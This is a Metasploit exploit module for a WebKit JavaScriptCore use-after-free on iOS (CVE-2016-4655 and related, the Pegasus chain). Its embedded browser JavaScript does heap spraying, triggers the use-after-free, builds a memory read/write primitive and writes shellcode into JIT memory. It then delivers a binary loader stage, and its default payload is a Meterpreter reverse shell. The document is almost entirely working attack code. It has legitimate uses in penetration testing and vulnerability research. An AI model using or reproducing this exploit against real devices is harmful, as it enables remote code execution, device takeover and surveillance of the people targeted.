##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WebKit not_number defineProperties UAF',
      'Description'    => %q{
          This module exploits a UAF vulnerability in WebKit's JavaScriptCore library.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'qwertyoruiop', # jbme.qwertyoruiop.com
        'siguza',       # PhoenixNonce
        'tihmstar',     # PhoenixNonce
        'timwr',        # metasploit integration
        ],
      'References'     => [
          ['CVE', '2016-4655'],
          ['CVE', '2016-4656'],
          ['CVE', '2016-4657'],
          ['BID', '92651'],
          ['BID', '92652'],
          ['BID', '92653'],
          ['URL', 'https://blog.lookout.com/trident-pegasus'],
          ['URL', 'https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/'],
          ['URL', 'https://www.blackhat.com/docs/eu-16/materials/eu-16-Bazaliy-Mobile-Espionage-in-the-Wild-Pegasus-and-Nation-State-Level-Attacks.pdf'],
          ['URL', 'https://github.com/Siguza/PhoenixNonce'],
          ['URL', 'https://jndok.github.io/2016/10/04/pegasus-writeup/'],
          ['URL', 'https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html'],
        ],
      'Arch'           => ARCH_AARCH64,
      'Platform'       => 'apple_ios',
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PAYLOAD' => 'apple_ios/aarch64/meterpreter_reverse_tcp' },
      'Targets'        => [[ 'Automatic', {} ]],
      'DisclosureDate' => 'Aug 25 2016'))
    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 8080 ]),
        OptString.new('URIPATH', [ true, "The URI to use for this exploit.", "/" ])
      ])
  end

  def on_request_uri(cli, request)
    print_status("Request from #{request['User-Agent']}")
    if request.uri =~ %r{/loader$}
      print_good("Target is vulnerable.")
      local_file = File.join( Msf::Config.data_directory, "meterpreter", "armle_iphone_stage" )
      loader_data = File.read(local_file, {:mode => 'rb'})
      send_response(cli, loader_data, {'Content-Type'=>'application/octet-stream'})
      return
    end
    html = %Q^
<html>
<body>
<script>
function load_binary_resource(url) {
  var req = new XMLHttpRequest();
  req.open('GET', url, false);
  req.overrideMimeType('text/plain; charset=x-user-defined');
  req.send(null);
  return req.responseText;
}

var pressure = new Array(400);
var bufs = new Array(10000);

var fcp = 0;
var smsh = new Uint32Array(0x10);

var trycatch = "";
for(var z=0; z<0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);

function swag() {
	if(bufs[0]) return;

	dgc();

	for (i=0; i < bufs.length; i++) {
    bufs[i] = new Uint32Array(0x100*2)
		for (k=0; k < bufs[i].length; )
		{
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
  console.log("doneswag");
}

function smashed() {

  var filestream = load_binary_resource("loader");
  console.log("smsh len="+smsh.length);

  console.log("fcp=0x"+fcp.toString(16));
  console.log("binfile=0x"+binfile.toString(16));


  // getJIT
  r2 = smsh[(fcp+0x14)/4];
  r3 = smsh[(r2+0x10)/4];
  shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;
  console.log("r2=0x"+r2.toString(16));
  console.log("r3=0x"+r3.toString(16));
  console.log("shellcode=0x"+shellcode.toString(16));

  smsh[shellcode/4] = 0;
  shellcode += 4;

  smsh[shellcode/4] = 0;
  shellcode += 4;

  smsh[shellcode/4] = 0;
  shellcode += 4;

  smsh[shellcode/4] = 0;
  shellcode += 4;

  for(var i = 0; i < filestream.length; i+=4)
  {
    var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
    smsh[(shellcode+i)/4] = word;
  }

  smsh[(fcp+0x00)/4] = fcp+4;
  smsh[(fcp+0x04)/4] = fcp+4;
  smsh[(fcp+0x08)/4] = shellcode+1; //PC
  smsh[(fcp+0x30)/4] = fcp+0x30+4-0x18-0x34+0x8;


  console.log("Do fc() smashed");
  fc();

  console.log("end smashed");
}

dgc = function() {
  console.log("dgc start");
	for (var i = 0; i < pressure.length; i++) {
    pressure[i] = new Uint32Array(0xa000);
	}
  console.log("dgc done");
}
dgcf = function() {
  console.log("dgcf start");
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = 0
	}
  console.log("dgcf done");
}

function swag() {
	if(bufs[0]) return;

	dgc();

	for (i=0; i < bufs.length; i++) {
		bufs[i] = new Uint32Array(0x100*2)
		for (k=0; k < bufs[i].length; )
		{
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
}

var binfile = 0;
var mem0=0;
var mem1=0;
var mem2=0;

_dview = null;
function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0, hi);
    _dview.setUint32(4, low);
    return _dview.getFloat64(0);
}

function go_(){
  var arr = new Array(2047);
  var not_number = {};
  not_number.toString = function() {
    arr = null;
    props["stale"]["value"] = null;
    swag();
    return 10;
  };

  smsh[0] = 0x21212121;
  smsh[1] = 0x31313131;
  smsh[2] = 0x41414141;
  smsh[3] = 0x51515151;
  smsh[4] = 0x61616161;
  smsh[5] = 0x71717171;
  smsh[6] = 0x81818181;
  smsh[7] = 0x91919191;

  var props = {
    p0 : { value : 0 },
    p1 : { value : 1 },
    p2 : { value : 2 },
    p3 : { value : 3 },
    p4 : { value : 4 },
    p5 : { value : 5 },
    p6 : { value : 6 },
    p7 : { value : 7 },
    p8 : { value : 8 },
    length : { value : not_number },
    stale : { value : arr },
    after : { value : 666 }
  };

  var target = [];
  var stale = 0;
  var before_len = arr.length;
  Object.defineProperties(target, props);
  stale = target.stale;

  if (stale.length != 0x41414141){
    setTimeout(function () {
      location.reload();
    }, 200);
    return;
  }

  var obuf = new Uint32Array(2);
  obuf[0] = 0x41414141;
  obuf[1] = 0xffff0000;

  stale[0] = 0x12345678;
  stale[1] = {};

  for(var z=0; z<0x100; z++) fc();

  console.log("pre array");
  for (i=0; i < bufs.length; i++) {
    var dobreak = 0;
    for (k=0; k < bufs[0].length; k++){
        if(bufs[i][k] != obuf[k%2]){

        console.log("bufs[i][k]  =0x"+bufs[i][k].toString(16));
        console.log("bufs[i][k+1]=0x"+bufs[i][k+1].toString(16));

        stale[0] = fc;
        fcp = bufs[i][k];

        stale[0] = smsh;
        var ptrsmsh = bufs[i][k];

        stale[2] = {'a':u2d(0x2,0x10),'b':smsh, 'c':u2d(0,0), 'd':u2d(0,0)}
        stale[0] = {'a':u2d(0,0x00e00600),'b':u2d(1,0x10), 'c':u2d(bufs[i][k+2*2]+0x10,0), 'd':u2d(0,0)}
        stale[1] = stale[0];
        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
        var leak = stale[0][0].charCodeAt(0);
            leak += stale[0][1].charCodeAt(0) << 8;
            leak += stale[0][2].charCodeAt(0) << 16;
            leak += stale[0][3].charCodeAt(0) << 24;
        console.log("leakptr=0x"+leak.toString(16));
        bufs[i][k] -= 0x10;
        stale[0] = {'a':u2d(leak,0x00602300), 'b':u2d(0,0), 'c':smsh, 'd':u2d(0,0)}
        stale[1] = stale[0];
        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
        stale[0][4] = 0;
        stale[0][5] = 0xffffffff;
        bufs[i][k] -= 0x10;

        mem0 = stale[0];
        mem2 = smsh;
        if (smsh.length != 0x10) {
          smashed();
        }
        dobreak = 1;
        break;
       }
     }
     if (dobreak) break;
   }

  console.log("end");
}

setTimeout(go_, 200);

</script>
</body>
</html>
    ^
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end
